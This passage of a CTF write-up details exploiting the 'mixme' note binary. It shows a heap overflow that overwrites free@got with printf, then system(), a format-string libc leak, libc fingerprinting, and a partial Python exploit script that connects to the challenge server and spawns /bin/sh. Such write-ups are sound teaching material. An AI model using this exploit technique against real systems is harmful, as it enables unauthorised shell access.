<p>With what should I overwrote the got pointer to <code>free()</code> though? I looked for ROP gadgets, but there weren&rsquo;t enough to pivot the stack into the heap and spawn a shell, or open/read/write the flag to stdout. Furthermore, I assumed ASLR was enabled so I had to leak libc addresses first.</p>

<p>After thinking about it, I chose to overwrite <code>free@got</code> with <code>printf@plt</code>. This turns the heap overflow into a format string vulnerability! Maybe this is where the challenge name comes from&hellip;</p>

<p>After setting <code>free@got</code> to <code>printf@plt</code>, whenever I ask the binary to <code>get</code> a note, I can print whatever content is associated with that note (because <code>free()</code> is called with the pointer to the content of the note).</p>

<p>I examined the stack by supplying a format string consisting of a bunch of <code>%x</code>&rsquo;s. Obviously, I couldn&rsquo;t dig up my own format string from the stack, because the format string itself is on the heap!</p>

<h2>What&rsquo;s that gem?</h2>

<p>Examining the stack, I dumped the following data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># local binary</span>
</span><span class='line'><span class="mi">85850</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b75c77b0</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mi">85850</span><span class="n">a0</span><span class="o">-</span><span class="mi">85850</span><span class="n">a0</span><span class="o">-</span><span class="mf">63.</span><span class="o">..</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>That third address looks promising! It points into <code>libc</code>. Unfortunately, there&rsquo;s a problem. Running the script against the server gave a different address:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c"># remote binary</span>
</span><span class='line'><span class="mi">83370</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b75c0024</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mi">83370</span><span class="n">a0</span><span class="o">-</span><span class="mi">83370</span><span class="n">a0</span><span class="o">-</span><span class="n">b7000063</span><span class="o">-...</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span><span class='line'><span class="mf">936e0</span><span class="n">c8</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="n">b764a024</span><span class="o">-</span><span class="mi">122</span><span class="o">-</span><span class="mf">936e0</span><span class="n">a0</span><span class="o">-</span><span class="mf">936e0</span><span class="n">a0</span><span class="o">-</span><span class="n">b7000063</span><span class="o">-...</span> <span class="o">&lt;</span><span class="n">snip</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We notice two things: ALSR is on and the remote binary seems to have a different libc than my local box (which was an Ubuntu 12.04 VM). I turned the format string into <code>%3$s</code> to find out which bytes were on the local and remote libc address. For the local binary, it returned <code>0x168bc085</code>. For the remote binary, however, it returned <code>0x7501c083</code>. These differences pointed towards different versions of libc. This was a nightmare! How am I supposed to find anything useful in libc without access to the specific library?</p>

<h2>Finding the correct libc</h2>

<p>I decided to try and identify the libc version. With less than 60 minutes to go, I went for it. If I had the right version of libc, I had everything to leak a libc address, add an offset to get <code>system()</code> and spawn a shell. I tried to nmap the remote server, which seemed too slow. However, <code>ssh</code> was enabled:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/nullcon/mixme<span class="nv">$ </span>ssh <span class="nb">test</span>@54.163.248.69 -vvv
</span><span class='line'>OpenSSH_6.0p1 Debian-4+deb7u2, OpenSSL 1.0.1e <span class="m">11</span> Feb 2013
</span><span class='line'>debug1: Reading configuration data /etc/ssh/ssh_config
</span><span class='line'>debug1: /etc/ssh/ssh_config line 19: Applying options <span class="k">for</span> *
</span><span class='line'>debug2: ssh_connect: needpriv 0
</span><span class='line'>debug1: Connecting to 54.163.248.69 <span class="o">[</span>54.163.248.69<span class="o">]</span> port 22.
</span><span class='line'>debug1: Connection established.
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_rsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_rsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_dsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_dsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_ecdsa <span class="nb">type</span> -1
</span><span class='line'>debug1: identity file /home/bas/.ssh/id_ecdsa-cert <span class="nb">type</span> -1
</span><span class='line'>debug1: Remote protocol version 2.0, remote software version OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
</span><span class='line'>&lt;snip&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Googling <code>OpenSSH_6.6.1p1 Ubuntu-2ubuntu2</code> led me to believe that Ubuntu 14.04 was being run. I downloaded all the i386 libc version I could find, unpacked them and searched them for the bytes I just leaked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/nullcon/mixme/libc<span class="nv">$ </span><span class="k">for</span> i in <span class="sb">`</span>ls<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> xxd <span class="nv">$i</span> <span class="p">|</span> egrep <span class="s1">&#39;83.?c0.?01.?75&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>libc-2.15-0ubuntu10.9.so
</span><span class='line'>
</span><span class='line'>0043740: <span class="m">8934</span> 24e8 f8f4 <span class="m">0200</span> 83c0 <span class="m">0175</span> b0c7 <span class="m">8570</span>  .4<span class="nv">$.</span>.......u...p
</span><span class='line'>00460a0: <span class="m">0000</span> <span class="m">0089</span> <span class="m">3424</span> e895 cb02 <span class="m">0083</span> c001 75bb  ....4<span class="nv">$.</span>.......u.
</span><span class='line'>0046720: <span class="m">0200</span> 83c0 <span class="m">0175</span> 80c7 <span class="m">8570</span> fbff ffff ffff  .....u...p......
</span><span class='line'>0046810: 2cc4 <span class="m">0200</span> 83c0 <span class="m">0175</span> a5c7 <span class="m">8570</span> fbff ffff  ,......u...p....
</span><span class='line'>0046890: e8ab c302 <span class="m">0083</span> c001 75ac c785 70fb ffff  ........u...p...
</span><span class='line'>0047320: <span class="m">4424</span> 04e8 18b9 <span class="m">0200</span> 83c0 <span class="m">0175</span> 80c7 <span class="m">8570</span>  D<span class="nv">$.</span>........u...p
</span><span class='line'>0047410: <span class="m">0000</span> <span class="m">0089</span> <span class="m">3424</span> e825 b802 <span class="m">0083</span> c001 75a4  ....4<span class="nv">$.</span>%......u.
</span><span class='line'>005a180: 83c0 <span class="m">0175</span> a4c7 85b0 efff ffff ffff ffe9  ...u............
</span><span class='line'>005b410: <span class="m">3424</span> e8f9 <span class="m">1001</span> <span class="m">0083</span> c001 75ae c785 b0ef  4<span class="nv">$.</span>.......u.....
</span><span class='line'>005c370: <span class="m">0089</span> <span class="m">3424</span> e897 <span class="m">0101</span> <span class="m">0083</span> c001 <span class="m">7580</span> c785  ..4<span class="nv">$.</span>.......u...
</span><span class='line'>00674c0: 0a00 <span class="m">0000</span> <span class="m">8904</span> 24e8 74b7 <span class="m">0000</span> 83c0 <span class="m">0175</span>  ......<span class="nv">$.</span>t......u
</span><span class='line'>
</span><span class='line'>libc-2.16-0ubuntu6.so
</span><span class='line'>
</span><span class='line'>0047b50: 83c0 <span class="m">0175</span> a8e9 97bf ffff 81e1 ff00 <span class="m">0000</span>  ...u............
</span><span class='line'>005ad90: <span class="m">0083</span> c001 75b9 e95b ccff ff8b 4d10 8b45  ....u..<span class="o">[</span>....M..E
</span><span class='line'>0066ab0: 7cb4 <span class="m">0000</span> 83c0 <span class="m">0175</span> 918d b426 <span class="m">0000</span> <span class="m">0000</span>  <span class="p">|</span>......u...<span class="p">&amp;</span>....
</span><span class='line'>
</span><span class='line'>libc-2.19-0ubuntu6.4.so
</span><span class='line'>
</span><span class='line'>00471c0: <span class="m">0489</span> <span class="m">3424</span> e817 9e02 <span class="m">0083</span> c001 758a e9d1  ..4<span class="nv">$.</span>.......u...
</span><span class='line'>0047920: 24e8 ba96 <span class="m">0200</span> 83c0 <span class="m">0175</span> c5e9 74c2 ffff  <span class="nv">$.</span>.......u..t...
</span><span class='line'>005a850: <span class="m">8904</span> 24e8 d801 <span class="m">0100</span> 83c0 <span class="m">0175</span> b8e9 04cc  ..<span class="nv">$.</span>.......u....
</span><span class='line'>005b3a0: 83c0 <span class="m">0175</span> c9e9 bcc0 ffff a810 8d74 <span class="m">2600</span>  ...u.........t<span class="p">&amp;</span>.
</span><span class='line'>0066020: bcaf <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span><span class='line'>
</span><span class='line'>libc-2.19-13ubuntu3.so
</span><span class='line'>
</span><span class='line'>00472a0: <span class="m">0489</span> <span class="m">3424</span> e877 9c02 <span class="m">0083</span> c001 758a e9d1  ..4<span class="nv">$.</span>w......u...
</span><span class='line'>0047a00: <span class="m">0000</span> <span class="m">8934</span> 24e8 <span class="m">1695</span> <span class="m">0200</span> 83c0 <span class="m">0175</span> c5e9  ...4<span class="nv">$.</span>.......u..
</span><span class='line'>0050e40: <span class="m">8904</span> 24e8 <span class="m">6879</span> <span class="m">0100</span> 83c0 <span class="m">0175</span> b8e9 04cc  ..<span class="nv">$.</span>hy.....u....
</span><span class='line'>0051990: 83c0 <span class="m">0175</span> c9e9 bcc0 ffff a810 8d74 <span class="m">2600</span>  ...u.........t<span class="p">&amp;</span>.
</span><span class='line'>0066100: 1cae <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span></code></pre></td></tr></table></div></figure>


<p>I struck gold with libc-2.19-0ubuntu6.4.so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0066020: bcaf <span class="m">0000</span> 83c0 <span class="m">0175</span> 988d b426 <span class="m">0000</span> <span class="m">0000</span>  .......u...<span class="p">&amp;</span>....
</span></code></pre></td></tr></table></div></figure>


<p>Those bytes (0x7501c083) where at an offset of <code>xxxx6024</code> in the binary, which looked very much like the third address on the stack dumped from the remote binary. This had to be the right libc version! I loaded up the binary on my Ubuntu VM with libc-2.19-0ubuntu6.4.so:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc-2.19-0ubuntu6.14.so ./mixme
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>and attached <code>gdb</code> to dump the address of <code>system()</code>. Using the aforementioned value from the stack, I calculated the offset to <code>system()</code>. I quickly modified my script to include this, overwriting <code>free@got</code> with <code>system()</code>. When I now made a note with the value <code>/bin/sh</code> and asked the binary to <code>get</code> that note, it wants to <code>free()</code> it. However, <code>free@got</code> is replaced with system(), effectively making the binary call <code>system('/bin/sh');</code>!</p>

<p>So, in true dirty-ctf-style, the following python script was written after hours of frantic tracing with gdb and coding in python.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># function to send commands to the binary</span>
</span><span class='line'><span class="k">def</span> <span class="nf">z</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">data</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connect to remote host</span>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.163.248.69&#39;</span><span class="p">,</span> <span class="mi">9005</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive banner</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># ask the binary to store three notes</span>
</span><span class='line'><span class="c"># we&#39;ll overflow a into b later on</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;a&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;AAAA&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;b&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;BBBB&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># the third note will hold our format string</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">format_str</span> <span class="o">=</span> <span class="s">&quot;--%3$x&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">format_str</span><span class="p">)))</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">format_str</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># edit a with a large value</span>
</span><span class='line'><span class="c"># this overflows and overwrites the note_info struct of b</span>
</span><span class='line'><span class="c"># the pointer to the data is overwriting with free@got</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing a to set b to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x62\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#       ^ overflow    ^ restore 0x29, &#39;b&#39;               ^ size of b ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="c"># overwrite free@got with printf</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with printf()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x080485f0</span><span class="p">))</span>  <span class="c"># free@got overwritten with printf</span>
</span><span class='line'>
</span><span class='line'><span class="c"># now &#39;get&#39; c and trigger the format string vulnerability</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] triggering format string&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;get&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;c&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">=</span> <span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">format_str</span><span class="p">)))</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># this proved to be a bit finicky:</span>
</span><span class='line'><span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'><span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">data</span>
</span><span class='line'><span class="c"># grab leaked libc address</span>
</span><span class='line'><span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&#39;x--(.*)cSel&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'><span class="k">if</span> <span class="n">m</span><span class="p">:</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">m</span>
</span><span class='line'>  <span class="n">leak</span> <span class="o">=</span> <span class="s">&quot;0x&quot;</span><span class="o">+</span><span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="n">leak_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] found first addr: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_hex</span><span class="p">))</span>
</span><span class='line'>  <span class="n">system</span> <span class="o">=</span> <span class="n">leak_hex</span> <span class="o">-</span> <span class="mi">155428</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;[+] system @ {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># repeat the same trick, but this time, overwrite free@got with system()</span>
</span><span class='line'><span class="c"># first note contains /bin/sh, used as argument for system()</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;7&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;t&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;TTTT&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;store&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;q&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;4&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;QQQQ&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] overflowing t to set q to free@got&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;t&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;40&#39;</span><span class="p">)</span>
